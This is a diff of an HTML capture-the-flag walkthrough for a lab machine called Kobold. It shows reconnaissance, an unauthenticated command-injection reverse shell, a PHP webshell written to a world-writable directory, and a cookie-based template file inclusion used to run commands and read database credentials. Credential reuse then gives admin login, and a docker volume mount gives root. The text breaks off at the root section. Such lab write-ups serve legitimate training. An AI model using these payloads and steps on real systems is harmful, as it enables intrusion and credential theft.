@@ -18,25 +18,34 @@ header{background:var(--bg3);border-bottom:1px solid var(--border);padding:0 2re
 .badge-easy{background:#9fef00;color:#000;}
 .badge-linux{background:var(--bg2);border:1px solid var(--border);color:var(--text);}
 .badge-seasonal{background:var(--purple);color:#fff;}
+.badge-unintended{background:var(--red);color:#fff;}
 .container{max-width:1000px;margin:0 auto;padding:3rem 2rem;}
 .hero{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:2.5rem;margin-bottom:2.5rem;position:relative;overflow:hidden;}
 .hero::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--green),var(--blue),var(--purple));}
+.hero-top{display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:1rem;margin-bottom:1.5rem;}
 .machine-name{font-family:'Share Tech Mono',monospace;font-size:2.8rem;color:var(--text-bright);letter-spacing:3px;line-height:1;}
 .machine-name span{color:var(--green);}
 .badges{display:flex;gap:.5rem;flex-wrap:wrap;margin-top:.8rem;}
-.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;margin-top:1.5rem;}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;}
 .stat{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:.8rem 1rem;}
 .stat-label{font-size:.7rem;text-transform:uppercase;letter-spacing:2px;color:var(--text);margin-bottom:.3rem;font-family:'Share Tech Mono',monospace;}
 .stat-value{font-size:1rem;color:var(--text-bright);font-family:'Share Tech Mono',monospace;}
 .stat-value.green{color:var(--green);}.stat-value.orange{color:var(--orange);}.stat-value.blue{color:var(--blue);}
-.chain{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.5rem 2rem;margin-bottom:2.5rem;font-family:'Share Tech Mono',monospace;font-size:.85rem;line-height:2;}
-.chain-title{color:var(--green);font-size:.75rem;letter-spacing:3px;text-transform:uppercase;margin-bottom:1rem;}
+.chain{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.5rem 2rem;margin-bottom:1.5rem;font-family:'Share Tech Mono',monospace;font-size:.85rem;line-height:2;}
+.chain-title{font-size:.75rem;letter-spacing:3px;text-transform:uppercase;margin-bottom:1rem;}
+.chain-title.intended{color:var(--green);}
+.chain-title.unintended{color:var(--red);}
 .chain-step .arrow{color:var(--green);}.chain-step .cve{color:var(--blue);}.chain-step .user{color:var(--orange);font-weight:700;}
 .section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:1.5rem;overflow:hidden;}
 .section-header{background:var(--bg3);border-bottom:1px solid var(--border);padding:1rem 1.5rem;display:flex;align-items:center;gap:1rem;}
 .section-num{width:28px;height:28px;background:var(--green);color:#000;border-radius:4px;display:flex;align-items:center;justify-content:center;font-family:'Share Tech Mono',monospace;font-size:.85rem;font-weight:700;flex-shrink:0;}
+.section-num.red{background:var(--red);color:#fff;}
+.section-num.blue{background:var(--blue);color:#fff;}
+.section-num.orange{background:var(--orange);color:#000;}
 .section-title{font-size:1.1rem;font-weight:700;color:var(--text-bright);text-transform:uppercase;letter-spacing:1px;}
 .section-cve{margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:.75rem;color:var(--blue);background:rgba(46,168,229,.1);border:1px solid rgba(46,168,229,.3);padding:2px 8px;border-radius:3px;}
+.section-tag{margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:.75rem;padding:2px 8px;border-radius:3px;}
+.section-tag.unintended{color:var(--red);background:rgba(255,62,62,.1);border:1px solid rgba(255,62,62,.3);}
 .section-body{padding:1.5rem;}
 p{margin-bottom:1rem;color:var(--text);font-size:1rem;}
 pre{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:1.2rem 1.5rem;overflow-x:auto;margin:1rem 0;position:relative;}
@@ -47,6 +56,7 @@ code{font-family:'JetBrains Mono',monospace;font-size:.82rem;line-height:1.8;col
 .info-box{border-left:3px solid var(--blue);background:rgba(46,168,229,.07);padding:.8rem 1rem;border-radius:0 5px 5px 0;margin:1rem 0;font-size:.9rem;}
 .warn-box{border-left:3px solid var(--orange);background:rgba(255,175,0,.07);padding:.8rem 1rem;border-radius:0 5px 5px 0;margin:1rem 0;font-size:.9rem;}
 .success-box{border-left:3px solid var(--green);background:rgba(159,239,0,.07);padding:.8rem 1rem;border-radius:0 5px 5px 0;margin:1rem 0;color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.85rem;}
+.danger-box{border-left:3px solid var(--red);background:rgba(255,62,62,.07);padding:.8rem 1rem;border-radius:0 5px 5px 0;margin:1rem 0;font-size:.9rem;color:var(--text);}
 table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.9rem;}
 th{background:var(--bg3);color:var(--green);font-family:'Share Tech Mono',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:2px;padding:.7rem 1rem;text-align:left;border-bottom:1px solid var(--border);}
 td{padding:.7rem 1rem;border-bottom:1px solid var(--border);color:var(--text);}
@@ -54,7 +64,11 @@ tr:last-child td{border-bottom:none;}tr:hover td{background:rgba(255,255,255,.02
 td:first-child{font-family:'Share Tech Mono',monospace;color:var(--blue);}
 h3{color:var(--text-bright);font-size:1rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin:1.5rem 0 .8rem;padding-bottom:.4rem;border-bottom:1px solid var(--border);}
 h3:first-child{margin-top:0;}
-.cred{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--orange);cursor:pointer;border:1px dashed rgba(255,175,0,.5);padding:1px 8px;border-radius:3px;background:rgba(255,175,0,.06);user-select:none;}
+.divider{border:none;border-top:2px solid var(--border);margin:2.5rem 0;position:relative;}
+.divider-label{position:absolute;top:-12px;left:50%;transform:translateX(-50%);background:var(--bg);padding:0 1rem;font-family:'Share Tech Mono',monospace;font-size:.75rem;letter-spacing:3px;text-transform:uppercase;}
+.divider-label.unintended{color:var(--red);}
+.cred{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--orange);cursor:pointer;border:1px dashed rgba(255,175,0,.5);padding:1px 8px;border-radius:3px;background:rgba(255,175,0,.06);user-select:none;transition:background .2s;}
+.cred:hover{background:rgba(255,175,0,.15);}
 #troll-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;}
 .troll-inner{background:#1e2b3d;border:1px solid var(--green);border-radius:8px;padding:2.5rem;max-width:420px;width:90%;text-align:center;font-family:'Rajdhani',sans-serif;position:relative;overflow:hidden;}
 .troll-inner::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--green),var(--blue));}
@@ -70,6 +84,7 @@ footer{text-align:center;padding:2rem;color:var(--text);font-family:'Share Tech 
 <header>
   <a href="../" class="logo">SKID<span>::</span>TUTS</a>
   <div class="header-right">
+    <span>2026-03-22</span>
     <span class="badge badge-seasonal">Seasonal</span>
     <span class="badge badge-linux">Linux</span>
     <span class="badge badge-easy">Easy</span>
@@ -79,80 +94,120 @@ footer{text-align:center;padding:2rem;color:var(--text);font-family:'Share Tech 
 <div class="container">
 
   <div class="hero">
-    <div class="machine-name">KOB<span>OLD</span></div>
-    <div class="badges">
-      <span class="badge badge-easy">Easy</span>
-      <span class="badge badge-linux">Linux</span>
-      <span class="badge badge-seasonal">Seasonal S10</span>
+    <div class="hero-top">
+      <div>
+        <div class="machine-name">KOB<span>OLD</span></div>
+        <div class="badges">
+          <span class="badge badge-easy">Easy</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-seasonal">Seasonal S10</span>
+        </div>
+      </div>
     </div>
     <div class="stats-grid">
       <div class="stat"><div class="stat-label">Target IP</div><div class="stat-value blue">10.10.X.X</div></div>
       <div class="stat"><div class="stat-label">OS</div><div class="stat-value">Linux (Ubuntu)</div></div>
-      <div class="stat"><div class="stat-label">Open Ports</div><div class="stat-value">22, 80, 3552</div></div>
+      <div class="stat"><div class="stat-label">Open Ports</div><div class="stat-value">22, 80, 443, 3552</div></div>
       <div class="stat"><div class="stat-label">User Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
       <div class="stat"><div class="stat-label">Root Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
-      <div class="stat"><div class="stat-label">CVEs Used</div><div class="stat-value orange">1</div></div>
+      <div class="stat"><div class="stat-label">CVEs Used</div><div class="stat-value orange">2</div></div>
     </div>
   </div>
 
+  <!-- INTENDED CHAIN -->
   <div class="chain">
-    <div class="chain-title">// Attack Chain</div>
-    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> nmap discovers Arcane v1.13.0 on :3552 + mcp.kobold.htb subdomain</div>
-    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> <span class="cve">CVE-2026-23520</span> unauthenticated /api/mcp/connect command injection &#8594; reverse shell as ben</div>
-    <div class="chain-step"><span class="user">ben</span> <span class="arrow">&#8594;</span> docker group membership &#8594; newgrp docker &#8594; host filesystem mount &#8594; root</div>
+    <div class="chain-title intended">// Intended Attack Chain</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> nmap + ffuf (large wordlist) &#8594; mcp.kobold.htb + bin.kobold.htb</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> <span class="cve">CVE-2026-23520</span> unauthenticated MCP RCE &#8594; reverse shell as ben &#8594; user flag</div>
+    <div class="chain-step"><span class="user">ben</span> <span class="arrow">&#8594;</span> write PHP webshell to world-writable /privatebin-data/data/</div>
+    <div class="chain-step"><span class="user">ben</span> <span class="arrow">&#8594;</span> <span class="cve">GHSA-g2j9-g8r5-rg82</span> PrivateBin template LFI &#8594; RCE in container &#8594; read conf.php &#8594; Arcane creds</div>
+    <div class="chain-step"><span class="user">arcane</span> <span class="arrow">&#8594;</span> login to Arcane dashboard &#8594; deploy privileged container with / mounted &#8594; root flag</div>
     <div class="chain-step"><span class="user">root</span> <span class="arrow">&#8594;</span> <span class="c-green">pwned &#10003;</span></div>
   </div>
 
-  <div class="section">
-    <div class="section-header"><div class="section-num">1</div><div class="section-title">Recon</div></div>
-    <div class="section-body">
-      <p>Start with a standard nmap scan, then follow up with a full port scan to make sure nothing is hiding on a high port.</p>
-      <pre data-label="bash"><code><span class="c-green">$</span> nmap -sC -sV -oN nmap.txt 10.10.X.X</code></pre>
-      <pre data-label="output"><code>PORT     STATE SERVICE VERSION
-<span class="c-green">22/tcp   open  ssh</span>     OpenSSH 8.9p1 Ubuntu
-<span class="c-green">80/tcp   open  http</span>    nginx/1.24.0 (Ubuntu)
-<span class="c-green">3552/tcp open  http</span>    Arcane Docker Management v1.13.0</code></pre>
-      <pre data-label="bash"><code><span class="c-green">$</span> nmap -p- -T4 --min-rate 5000 -oN nmap-full.txt 10.10.X.X</code></pre>
-      <p>Port 80 serves a landing page for the Kobold Operations Suite. Port 3552 is running <span class="ic">Arcane</span> — an open source Docker management platform. Add the hostname and enumerate for virtual hosts:</p>
-      <pre data-label="bash"><code><span class="c-green">$</span> echo <span class="c-orange">"10.10.X.X kobold.htb mcp.kobold.htb"</span> | sudo tee -a /etc/hosts
-
-<span class="c-green">$</span> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -u http://kobold.htb -H <span class="c-orange">"Host: FUZZ.kobold.htb"</span> -mc 200,301,302 -fw 1</code></pre>
-      <pre data-label="output"><code><span class="c-green">mcp</span>    [Status: 301, Size: 169]</code></pre>
-      <p>Two surfaces: <span class="ic">kobold.htb:3552</span> (Arcane API) and <span class="ic">mcp.kobold.htb</span> — an MCPJam Inspector instance for interacting with the Arcane MCP server. Browsing to <span class="ic">http://kobold.htb:3552/api/docs</span> reveals a full Scalar API reference with no authentication required.</p>
-      <div class="info-box">Always read the full API docs when a management interface is exposed. The <span class="ic">/api/mcp</span> section is what gives this box away immediately — it describes an endpoint that executes arbitrary commands.</div>
-    </div>
+  <!-- UNINTENDED CHAIN -->
+  <div class="chain" style="border-color:rgba(255,62,62,.3);">
+    <div class="chain-title unintended">// Unintended Attack Chain (misconfiguration)</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> <span class="cve">CVE-2026-23520</span> MCP RCE &#8594; shell as ben &#8594; user flag</div>
+    <div class="chain-step"><span class="user">ben</span> <span class="arrow">&#8594;</span> operator group gives docker socket access &#8594; sg docker / newgrp docker</div>
+    <div class="chain-step"><span class="user">ben</span> <span class="arrow">&#8594;</span> docker run -v /:/hostfs &#8594; host filesystem mount &#8594; root flag</div>
+    <div class="chain-step"><span class="user">root</span> <span class="arrow">&#8594;</span> <span class="c-red">pwned (unintended) &#10003;</span></div>
   </div>
 
-  <div class="section">
-    <div class="section-header"><div class="section-num">2</div><div class="section-title">Arcane API Enumeration</div></div>
-    <div class="section-body">
-      <p>The API docs expose Arcane v1.13.0. Checking that version against public CVEs surfaces <span class="ic">CVE-2026-23520</span> — a critical command injection in Arcane's updater lifecycle label handling. More directly, the <span class="ic">/api/mcp/connect</span> endpoint accepts a <span class="ic">serverConfig</span> JSON object with a <span class="ic">command</span>, <span class="ic">args</span>, and <span class="ic">env</span> — and executes it with no authentication whatsoever.</p>
-      <table>
-        <tr><th>Endpoint</th><th>Method</th><th>Auth Required</th><th>Notes</th></tr>
-        <tr><td>/api/auth/login</td><td>POST</td><td>No</td><td>Default creds fail — dead end</td></tr>
-        <tr><td>/api/api-keys</td><td>GET/POST</td><td>Yes</td><td>Requires valid session</td></tr>
-        <tr><td>/api/mcp/connect</td><td>POST</td><td><span style="color:var(--red)">No</span></td><td>Executes arbitrary commands — our way in</td></tr>
-        <tr><td>/api/environments/{id}/updater/run</td><td>POST</td><td>Yes</td><td>Triggers container update lifecycle (CVE-2026-23520 alt path)</td></tr>
-      </table>
-      <div class="warn-box"><strong>CVE-2026-23520:</strong> Arcane v1.13.0 passes the <span class="ic">/api/mcp/connect</span> serverConfig command payload directly to the system with no authentication or input sanitisation. Any unauthenticated user can achieve RCE on the host.</div>
-    </div>
-  </div>
-
+  <!-- SECTION 1 - RECON -->
   <div class="section">
     <div class="section-header">
-      <div class="section-num">3</div>
+      <div class="section-num">1</div>
+      <div class="section-title">Recon</div>
+    </div>
+    <div class="section-body">
+      <p>Start with a standard nmap scan to identify open services, then follow up with a full port scan to catch anything on non-standard ports.</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> nmap -sC -sV -oN nmap.txt 10.10.X.X</code></pre>
+      <pre data-label="output"><code>PORT    STATE SERVICE  VERSION
+<span class="c-green">22/tcp  open  ssh</span>      OpenSSH 9.6p1 Ubuntu
+<span class="c-green">80/tcp  open  http</span>     nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+<span class="c-green">443/tcp open  ssl/http</span> nginx/1.24.0 (Ubuntu)
+| ssl-cert: Subject: commonName=kobold.htb
+| Subject Alternative Name: DNS:kobold.htb, <span class="c-green">DNS:*.kobold.htb</span>
+|_http-title: Did not follow redirect to https://kobold.htb/</code></pre>
+
+      <div class="info-box">The wildcard SAN <span class="ic">*.kobold.htb</span> in the TLS certificate immediately signals that subdomains are in scope. Always check SANs — they save enumeration time.</div>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> nmap -p- -T4 --min-rate 5000 -oN nmap-full.txt 10.10.X.X</code></pre>
+      <pre data-label="output"><code>PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+<span class="c-green">3552/tcp open  taserver</span></code></pre>
+
+      <p>Port 3552 is the Arcane Docker management platform. Add all known hosts to <span class="ic">/etc/hosts</span> and enumerate subdomains — the standard 5000-entry wordlist only finds <span class="ic">mcp</span>, so use the larger bitquark list to make sure nothing is missed.</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> echo <span class="c-orange">"10.10.X.X kobold.htb mcp.kobold.htb bin.kobold.htb"</span> | sudo tee -a /etc/hosts
+
+<span class="c-dim"># Check baseline response for non-existent vhost to calibrate the filter</span>
+<span class="c-green">$</span> curl -sk -o /dev/null -w <span class="c-orange">"%{http_code} %{size_download}\n"</span> \
+  https://kobold.htb -H <span class="c-orange">"Host: doesntexist.kobold.htb"</span>
+<span class="c-dim">302 154</span>
+
+<span class="c-green">$</span> ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+  -u https://kobold.htb \
+  -H <span class="c-orange">"Host: FUZZ.kobold.htb"</span> \
+  -k -fc 302 -fs 154</code></pre>
+
+      <pre data-label="output"><code><span class="c-green">mcp</span>    [Status: 200, Size: 466]
+<span class="c-green">bin</span>    [Status: 200, Size: 24402]</code></pre>
+
+      <p>Three surfaces to work with:</p>
+
+      <table>
+        <tr><th>Host</th><th>Port</th><th>Service</th></tr>
+        <tr><td>kobold.htb:3552</td><td>3552</td><td>Arcane Docker Management v1.13.0</td></tr>
+        <tr><td>mcp.kobold.htb</td><td>443</td><td>MCPJam Inspector (Arcane MCP server frontend)</td></tr>
+        <tr><td>bin.kobold.htb</td><td>443</td><td>PrivateBin 2.0.2</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- SECTION 2 - INITIAL ACCESS -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">2</div>
       <div class="section-title">Initial Access — Unauthenticated RCE via MCP</div>
       <span class="section-cve">CVE-2026-23520</span>
     </div>
     <div class="section-body">
-      <p>The MCPJam Inspector at <span class="ic">https://mcp.kobold.htb</span> sits in front of the Arcane MCP server backend. Rather than clicking through the UI, go directly to the underlying <span class="ic">/api/mcp/connect</span> endpoint via the browser console. Being on the <span class="ic">mcp.kobold.htb</span> origin means a plain <span class="ic">fetch()</span> call works with no CORS issues.</p>
+      <p>Browsing to <span class="ic">http://kobold.htb:3552/api/docs</span> reveals a full Scalar API reference with no authentication required. Reading through the endpoint list, the <span class="ic">POST /api/mcp/connect</span> endpoint stands out immediately — it accepts a <span class="ic">serverConfig</span> JSON object specifying a <span class="ic">command</span>, <span class="ic">args</span>, and <span class="ic">env</span> to execute, with no authentication check. This is part of the broader CVE-2026-23520 attack surface in Arcane v1.13.0.</p>
 
-      <h3>Step 1 — Set Up the Listener</h3>
+      <div class="warn-box"><strong>CVE-2026-23520:</strong> Arcane v1.13.0 passes the <span class="ic">/api/mcp/connect</span> serverConfig payload directly to the system without authentication or sanitisation. Any unauthenticated user can achieve remote code execution on the host.</div>
+
+      <h3>Step 1 — Start the Listener</h3>
       <pre data-label="bash"><code><span class="c-green">$</span> nc -lvnp 4444</code></pre>
 
       <h3>Step 2 — Trigger the Reverse Shell</h3>
-      <p>Navigate to <span class="ic">https://mcp.kobold.htb</span>, open DevTools with <span class="ic">F12</span>, and paste the following in the console — replacing the IP with your tun0 address:</p>
+      <p>Navigate to <span class="ic">https://mcp.kobold.htb</span>, open the developer console with <span class="ic">F12</span>, and paste the fetch payload. The browser is already on the correct origin so no CORS restrictions apply:</p>
+
       <pre data-label="js (browser console)"><code><span class="c-green">fetch</span>(<span class="c-orange">'/api/mcp/connect'</span>, {
   <span class="c-blue">method</span>: <span class="c-orange">'POST'</span>,
   <span class="c-blue">headers</span>: {<span class="c-orange">'Content-Type'</span>: <span class="c-orange">'application/json'</span>},
@@ -166,13 +221,14 @@ footer{text-align:center;padding:2rem;color:var(--text);font-family:'Share Tech 
   })
 })</code></pre>
 
-      <p>Stabilise the shell before continuing:</p>
+      <p>Shell connects back immediately. Stabilise it:</p>
+
       <pre data-label="bash"><code><span class="c-green">$</span> python3 -c <span class="c-orange">'import pty;pty.spawn("/bin/bash")'</span>
 <span class="c-dim"># Ctrl+Z</span>
 <span class="c-green">$</span> stty raw -echo; fg
 <span class="c-green">$</span> export TERM=xterm</code></pre>
 
-      <div class="success-box">ben@kobold:~$ id<br>uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator),<span class="c-green">111(docker)</span></div>
+      <div class="success-box">ben@kobold:~$ id<br>uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</div>
 
       <h3>User Flag</h3>
       <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> cat ~/user.txt</code></pre>
@@ -180,68 +236,186 @@ footer{text-align:center;padding:2rem;color:var(--text);font-family:'Share Tech 
     </div>
   </div>
 
-  <div class="section">
-    <div class="section-header"><div class="section-num">4</div><div class="section-title">Enumeration as ben</div></div>
-    <div class="section-body">
-      <p>The very first command after landing a shell should always be <span class="ic">id</span>. On this box, that single command tells you exactly how you're getting root.</p>
-      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> id
-uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator),<span class="c-green">111(docker)</span></code></pre>
-      <p>Ben is in the <span class="ic">docker</span> group. Confirm the socket is accessible and check what images are already pulled:</p>
-      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> ls -la /var/run/docker.sock
-srw-rw---- 1 root docker 0 Mar 21 19:08 /var/run/docker.sock
-
-<span class="c-green">ben@kobold:~$</span> docker images</code></pre>
-      <pre data-label="output"><code>REPOSITORY                   TAG    IMAGE ID       CREATED        SIZE
-mysql                        latest f66b7a288113   6 weeks ago    922MB
-<span class="c-green">privatebin/nginx-fpm-alpine   2.0.2  f5f5564e6731   4 months ago   122MB</span></code></pre>
-      <div class="info-box"><strong>Why docker?</strong> The <span class="ic">id</span> output lists <span class="ic">111(docker)</span> in ben's supplementary groups, and the socket is group-owned by <span class="ic">docker</span> with rw permissions. Docker group membership gives full control of the daemon which runs as root — effectively equivalent to a sudo entry. <span class="ic">privatebin/nginx-fpm-alpine:2.0.2</span> is already present locally so no internet access is needed.</div>
-      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> ls /privatebin-data/
-certs  cfg  data
-
-<span class="c-green">ben@kobold:/privatebin-data/certs$</span> ls
-cert.pem  key.pem</code></pre>
-      <p>The <span class="ic">/privatebin-data</span> directory contains TLS certs for <span class="ic">*.kobold.htb</span> — a rabbit hole. The docker path is the intended route.</p>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-header"><div class="section-num">5</div><div class="section-title">Privilege Escalation — Docker Group → Root</div></div>
-    <div class="section-body">
-      <p>The reverse shell was spawned without docker as the active GID. Use <span class="ic">newgrp</span> to switch the active group in the current session:</p>
-      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> newgrp docker
-<span class="c-green">ben@kobold:~$</span> id
-uid=1001(ben) gid=<span class="c-green">111(docker)</span> groups=111(docker),37(operator),1001(ben)</code></pre>
-      <p>Mount the entire host filesystem into the <span class="ic">privatebin/nginx-fpm-alpine:2.0.2</span> container — already present locally — and <span class="ic">chroot</span> into it for a full root shell on the host:</p>
-      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> docker run -it --rm \
-  -v /:/hostfs \
-  --user root \
-  --entrypoint /bin/bash \
-  privatebin/nginx-fpm-alpine:2.0.2 \
-  -c <span class="c-orange">'chroot /hostfs /bin/bash'</span></code></pre>
-      <pre data-label="output"><code><span class="c-green">root@a3f91c2d7b1e:/#</span> id
-uid=0(root) gid=0(root) groups=0(root)</code></pre>
-
-      <p>Or read the root flag directly in a single command without an interactive shell:</p>
-      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> docker run -v /:/hostfs --rm --user root \
-  --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt</code></pre>
-      <div class="success-box">root@kobold:~# cat /root/root.txt<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
-
-      <h3>Why This Works</h3>
-      <p>The Docker daemon runs as root and honours all volume mounts specified by users in the docker group. The <span class="ic">-v /:/hostfs</span> flag maps the entire host filesystem into the container. Running as root inside the container, <span class="ic">chroot /hostfs</span> rebases the process root to that mount — giving a full root shell on the host with no sandbox escape, kernel exploit, or SUID binary needed.</p>
-    </div>
-  </div>
-
+  <!-- SECTION 3 - PRIVATEBIN WEBSHELL -->
   <div class="section">
     <div class="section-header">
-      <div class="section-num" style="background:var(--blue);">i</div>
-      <div class="section-title">CVE Summary</div>
+      <div class="section-num">3</div>
+      <div class="section-title">PrivateBin — Drop a Webshell</div>
+    </div>
+    <div class="section-body">
+      <p>With a shell as ben, enumerate accessible directories. The <span class="ic">/privatebin-data</span> directory is the data volume for the <span class="ic">bin.kobold.htb</span> PrivateBin container, mounted directly on the host. Checking permissions reveals the <span class="ic">data/</span> subdirectory is world-writable:</p>
+
+      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> ls -la /privatebin-data/data/</code></pre>
+      <pre data-label="output"><code>drwxrwxrwx 5 root   operator 4096 Mar 15 21:23 <span class="c-green">.</span>
+drwxrwx--- 5 root   operator 4096 Mar 15 21:23 ..
+-rwxrwxrwx 1 root   operator   19 Feb 16 08:29 .htaccess
+drwx------ 3 nobody       82 4096 Mar 15 21:23 12
+drwxrwxrwx 3 root   operator 4096 Mar 15 21:23 bd
+drwx------ 3 root   operator 4096 Mar 15 21:23 e3
+-rwxrwxrwx 1 root   operator   47 Mar  4 12:49 purge_limiter.php
+-rwxrwxrwx 1 root   operator  522 Feb 16 08:29 salt.php</code></pre>
+
+      <p>The <span class="ic">data/</span> directory has <span class="ic">777</span> permissions — ben can write there directly. Since the PrivateBin container serves PHP files from this directory and we know the container config lives at <span class="ic">/srv/cfg/conf.php</span> (standard PrivateBin Docker path), write a PHP webshell:</p>
+
+      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> echo <span class="c-orange">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> > /privatebin-data/data/shell.php
+<span class="c-green">ben@kobold:~$</span> ls -la /privatebin-data/data/shell.php
+-rw-r--r-- 1 ben ben 31 Mar 22 11:04 /privatebin-data/data/shell.php</code></pre>
+    </div>
+  </div>
+
+  <!-- SECTION 4 - LFI -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">4</div>
+      <div class="section-title">PrivateBin Template LFI → Arcane Credentials</div>
+      <span class="section-cve">GHSA-g2j9-g8r5-rg82</span>
+    </div>
+    <div class="section-body">
+      <p>PrivateBin 2.0.2 has a template-switching feature that stores the user's chosen theme in a <span class="ic">template</span> cookie. When <span class="ic">templateselection = true</span> is set in the config (which it is here — visible from the theme switcher in the top-right of the UI), the server trusts the cookie value and includes the corresponding template file without validating the path. This allows local file inclusion by setting the cookie to a path-traversal value pointing to any readable file on the server.</p>
+
+      <div class="info-box">The theme dropdown visible on <span class="ic">bin.kobold.htb</span> is the tell — if template selection is enabled in the UI, <span class="ic">templateselection = true</span> is set in the config, and the LFI is live.</div>
+
+      <h3>Step 1 — Confirm RCE in the Container</h3>
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -sk <span class="c-orange">"https://bin.kobold.htb/?cmd=id"</span> \
+  --cookie <span class="c-orange">"template=../data/shell"</span></code></pre>
+      <pre data-label="output"><code>uid=65534(nobody) gid=82(www-data) groups=82(www-data)</code></pre>
+
+      <p>RCE confirmed inside the PrivateBin container as <span class="ic">nobody/www-data</span>. Now read the PrivateBin config file — the standard path inside the official Docker image is <span class="ic">/srv/cfg/conf.php</span>:</p>
+
+      <h3>Step 2 — Read the Config</h3>
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -sk <span class="c-orange">"https://bin.kobold.htb/?cmd=cat+/srv/cfg/conf.php"</span> \
+  --cookie <span class="c-orange">"template=../data/shell"</span></code></pre>
+
+      <p>The config reveals a MySQL database configuration that was temporarily commented out during a server migration — but the credentials were left in place:</p>
+
+      <pre data-label="conf.php"><code>[model]
+<span class="c-dim">; Temporarily disabling while we migrate to new server for loadbalancing</span>
+<span class="c-dim">;class = Database</span>
+[model_options]
+dsn = <span class="c-orange">"mysql:host=localhost;dbname=privatebin;charset=UTF8"</span>
+tbl = <span class="c-orange">"privatebin_"</span>
+usr = <span class="c-orange">"privatebin"</span>
+pwd = <span class="cred" onclick="showTroll()">&#128274; REDACTED</span>
+opt[12] = true</code></pre>
+
+      <div class="success-box">Credentials extracted: privatebin / <span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
+    </div>
+  </div>
+
+  <!-- SECTION 5 - ARCANE LOGIN -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">5</div>
+      <div class="section-title">Arcane Dashboard — Admin Login</div>
+    </div>
+    <div class="section-body">
+      <p>The extracted password is being reused. Arcane's default admin username is <span class="ic">arcane</span> — the software ships with this as the built-in administrator account name. Try it against the login endpoint on port 3552:</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -sk -X POST http://kobold.htb:3552/api/auth/login \
+  -H <span class="c-orange">"Content-Type: application/json"</span> \
+  -d <span class="c-orange">'{"username":"arcane","password":"<span class="cred" onclick="showTroll()">&#128274; REDACTED</span>"}'</span></code></pre>
+
+      <pre data-label="output"><code>{
+  <span class="c-green">"success"</span>: true,
+  <span class="c-blue">"data"</span>: {
+    <span class="c-green">"token"</span>: <span class="c-orange">"eyJhbGci..."</span>,
+    <span class="c-blue">"user"</span>: {
+      <span class="c-green">"username"</span>: <span class="c-orange">"arcane"</span>,
+      <span class="c-green">"displayName"</span>: <span class="c-orange">"Arcane Admin"</span>,
+      <span class="c-green">"roles"</span>: [<span class="c-orange">"admin"</span>]
+    }
+  }
+}</code></pre>
+
+      <p>Admin access confirmed. Navigate to <span class="ic">http://kobold.htb:3552</span> in the browser and log in with <span class="ic">arcane : <span class="cred" onclick="showTroll()">&#128274; REDACTED</span></span>. The dashboard shows the running infrastructure — the <span class="ic">bin</span> container running <span class="ic">privatebin/nginx-fpm-alpine:2.0.2</span> on port 8080, and the <span class="ic">mysql</span> image sitting unused.</p>
+    </div>
+  </div>
+
+  <!-- SECTION 6 - ROOT -->
+  <div class="section">
+    <div class="section-header">
